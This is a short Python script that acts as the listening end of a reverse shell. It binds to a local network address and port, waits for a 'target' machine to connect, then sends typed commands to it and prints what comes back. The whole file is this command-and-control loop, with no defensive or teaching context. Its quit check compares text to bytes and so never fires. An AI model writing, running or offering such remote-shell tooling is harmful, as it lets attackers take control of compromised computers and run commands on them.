#!/usr/bin/python

import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("192.168.0.167",54321))
s.listen(5)
print("LISTENING for incoming connections")
target,ip =s.accept()
print("target connected!")
while True:
        command=input("* shell#~%s: " % str(ip))
        target.send(command.encode())
        if command == b"q":
                break
        else:
                result=target.recv(1024)
                print(result.decode())
s.close()

